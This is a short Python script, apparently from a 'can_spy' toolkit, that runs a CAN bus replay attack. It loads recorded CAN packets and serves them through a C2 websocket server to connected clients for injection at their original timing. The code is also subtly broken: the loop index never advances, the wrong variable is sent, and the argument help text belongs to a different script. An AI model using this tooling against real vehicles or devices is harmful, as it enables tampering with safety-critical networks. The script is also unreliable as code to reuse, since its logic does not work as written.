#!/usr/bin/python3

import argparse
import asyncio
import time

from can_spy.c2_server import C2Server
from can_spy.can_packet import CanPacket
from can_spy.can_sequence import parse_can_sequence_file


def time_microseconds() -> int:
    return int(time.time() * 1_000_000)  # time in microseconds

async def handle_client(websocket, sequence: list[CanPacket], args: argparse.Namespace):
    print("Running Replay Attack")
    print(sequence)

    # Normalize timestamp values at 0
    first_packet_timestamp = sequence[0].timestamp
    for packet in sequence:
        packet.timestamp -= first_packet_timestamp

    i = 0
    attack_start = time_microseconds()
    while (i < len(sequence)):
        current_time = time_microseconds()
        elapsed_time = current_time - attack_start

        if (elapsed_time > sequence[i].timestamp):
            await websocket.send(packet.serialize())
    
    print("Finished Attack")

def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Records and serializes websocket activity to a pickle file for later examination or use in replay attack.")

    parser.add_argument("-f", "--input_file",
                        type=str,
                        required=True,
                        help="Path to read recorded serialized CAN packets from. Can be produced using the `listen` script")
    return parser.parse_args()

def main():
    """Replay Attack example script"""

    args = parse_arguments()

    try:
        sequence: list[CanPacket] = parse_can_sequence_file(args.input_file)
    except FileNotFoundError:
        print(f"File: {args.input_file} not found.")

    # Sort sequence by timestamp
    sequence = sorted(sequence, key=lambda packet: packet.timestamp)

    client_handler = lambda websocket: handle_client(websocket, sequence, args)
    c2 = C2Server(client_handler=client_handler)
    c2.serve_forever()
        
if __name__ == "__main__":
    main()